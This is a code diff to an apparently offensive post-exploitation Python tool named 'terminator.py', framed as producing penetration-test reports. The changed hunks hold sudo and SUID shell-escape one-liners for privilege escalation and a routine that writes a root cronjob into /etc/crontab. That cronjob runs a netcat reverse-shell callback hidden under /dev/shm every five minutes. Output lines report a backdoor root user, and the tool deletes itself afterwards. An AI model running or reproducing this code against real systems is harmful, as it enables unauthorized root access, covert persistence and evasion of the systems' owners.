@@ -334,7 +334,8 @@ def sudo_l():
       "mysql":"sudo mysql -e '\\! /bin/sh'",
       "perl":"sudo perl -e \"exec '/bin/sh';\"",
       "php":"CMD='/bin/sh'&&sudo php -r \"system('$CMD');\"",
-      "python":"sudo python -c 'import os; os.system(\"/bin/sh\")'",
+      "python":"sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+      "python":"sudo python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
       "ruby":"sudo ruby -e 'exec \"/bin/sh\"'",
       "scp":"TF=$(mktemp)&&echo 'sh 0<&2 1>&2' > $TF&&chmod +x '$TF'&&sudo scp -S $TF x y:",
       "ssh":"sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x", 
@@ -398,7 +399,7 @@ def suid():
    "openvpn":"openvpn --dev null --script-security 2 --up \"/bin/sh -p -c 'sh -p'\"",
    "perl":"perl -e \"exec '/bin/sh';\"",
    "php":"CMD='/bin/sh'&&php -r \"system('$CMD');\"",
-   "python":"python3 -c 'import os; os.system(\"/bin/sh\")'",
+   "python":"python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "rsync":"rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "ssh-agent":"ssh-agent /bin/ -p",
    "ssh-keygen":"ssh-keygen -D lib.so",
@@ -602,7 +603,7 @@ def callback(local_ip, local_port):
 def cron_make():
    print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data_log'---")
    os.system("echo '5 * * * * root /dev/shm/.data/data_log' >> /etc/crontab")
-   os.system("echo '' >> /etc/crontab")
+   os.system("echo ' ' >> /etc/crontab")
    print("\n### cronjob created ###")
 
 
@@ -747,10 +748,12 @@ def clear_tracks(username,password,local_ip,local_port):
 
    # print persistence info to screen
    print("\n\n### persistence established with the following ###")
-   print("- user {}:{} was added with root privileges".format(username,password))
-   print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
-   print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}\n".format(local_ip,local_port))
-   print("-- to catch shell run 'nc -nlvp {}' on local machine\n".format(local_port))
+   print("\n### sometimes elevated users still do not have access to /etc/shadow or /etc/crontab; persistence is dependent on elevated user having these permissions ###")
+   print("\n### if elevated user does not have these permissions, try the privesc technique manually ###")
+   print("\n- user {}:{} was added with root privileges".format(username,password))
+   print("\n- nc reverse shell callback implanted at /dev/shm/.data/data_log")
+   print("\n- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}".format(local_ip,local_port))
+   print("\n-- to catch shell run 'nc -nlvp {}' on local machine\n".format(local_port))
 
    # delete terminator.py file
    os.system("rm -f terminator.py")
@@ -787,8 +790,8 @@ def report(output):
    os.system("echo '' >> /terminator/report.txt")
    os.system("echo '' >> /terminator/report.txt")
    os.system("echo '--- END OF REPORT ---' >> /terminator/report.txt")
-   os.system("mv /terminator/report.txt /terminator/{}".format(output))
-   print("### penetration test report for {} is ready at /terminator/{} ###\n\n### please add your method for gaining the initial shell in the '+ + + Stage 2 - Exploitation / Initial Shell + + +' section. ###\n\n###all reference data for enumeration, privilege escalation, and persistence/data exfiltration are located in /terminator/ as enum.txt, priv.txt, and data_exfil.txt, respectively ###".format(ip,output))
+   os.system("mv /terminator/report.txt /terminator/{}.txt".format(output))
+   print("### penetration test report for {} is ready at /terminator/{}.txt ###\n\n### please add your method for gaining the initial shell in the '+ + + Stage 2 - Exploitation / Initial Shell + + +' section. ###\n\n###all reference data for enumeration, privilege escalation, and persistence/data exfiltration are located in /terminator/ as enum.txt, priv.txt, and data_exfil.txt, respectively ###".format(ip,output))
    ipf.close()
 
 
@@ -856,6 +859,8 @@ def doc_make(output):
    document.add_page_break()
    document.add_heading("Persistence and Data Exfiltration", level=1)
    document.add_paragraph(xx)
+   document.add_paragraph("- Target Terminated -")
+   document.add_paragraph("--- END OF REPORT ---")
    document.save("{}.docx".format(cut))
    os.system("mv {}.docx /terminator/{}.docx".format(cut,cut))
 
@@ -864,7 +869,8 @@ def doc_make(output):
    x.close()
    ipf.close()
 
-   print("\n-+- Word document saved to /terminator/{}.docx -+-".format(cut))
+   print("\n-+- text report saved to /terminator/{}.txt -+-".format(cut))
+   print("\n-+- Word document report saved to /terminator/{}.docx -+-".format(cut))
 
 
 # call functions
